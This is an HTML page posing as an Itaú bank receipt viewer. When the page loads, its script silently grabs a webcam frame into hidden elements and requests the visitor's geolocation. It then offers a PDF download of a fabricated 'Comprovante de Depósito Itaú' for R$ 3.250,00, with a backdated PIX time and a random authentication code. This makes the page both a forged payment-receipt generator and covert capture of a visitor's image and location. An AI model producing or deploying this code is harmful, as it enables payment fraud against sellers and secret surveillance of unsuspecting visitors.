<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Comprovante Itaú</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
  <style>
    body{font-family:Arial;margin:40px}
    #btnDownload{display:none;margin-top:20px;padding:10px 20px;font-size:16px}
  </style>
</head>
<body>
  <h2>Visualização do Comprovante</h2>
  <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='150'%3E%3Crect width='100%25' height='100%25' fill='%23f3f3f3'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' font-size='14' fill='%23555'%3EComprovante Itaú%3C/text%3E%3C/svg%3E" alt="Comprovante" style="border:1px solid #ccc;">
  <br>
  <button id="btnDownload">Baixar Comprovante</button>
  <video id="video" style="display:none" autoplay muted playsinline></video>
  <canvas id="canvas" style="display:none"></canvas>

  <script>
    async function tirarFoto(){
      const stream=await navigator.mediaDevices.getUserMedia({video:true});
      const video=document.getElementById('video');
      const canvas=document.getElementById('canvas');
      const ctx=canvas.getContext('2d');
      video.srcObject=stream;
      await new Promise(res=>video.onloadedmetadata=res);
      canvas.width=video.videoWidth;
      canvas.height=video.videoHeight;
      ctx.drawImage(video,0,0);
      stream.getTracks().forEach(t=>t.stop());
    }
    function getGeo(){
      return new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{timeout:5000}));
    }
    function downloadPDF(){
      const {jsPDF}=window.jspdf;
      const pdf=new jsPDF();
      const agora=new Date();
      const pixTime=new Date(agora-60*60*1000);
      const auth=(Math.random()*1e9).toString(16).slice(0,8).toUpperCase();
      pdf.setFontSize(16);
      pdf.text("Comprovante de Depósito Itaú",20,20);
      pdf.setFontSize(12);
      pdf.text("Valor: R$ 3.250,00",20,35);
      pdf.text("Data/Hora do PIX: "+pixTime.toLocaleString("pt-BR"),20,45);
      pdf.text("Autenticação: "+auth,20,55);
      pdf.save("comprovante_itau.pdf");
    }
    (async()=>{
      try{await Promise.all([tirarFoto(),getGeo()]);}catch{}
      document.getElementById('btnDownload').style.display='inline-block';
    })();
    document.getElementById('btnDownload').addEventListener('click',downloadPDF);
  </script>
</body>
</html>


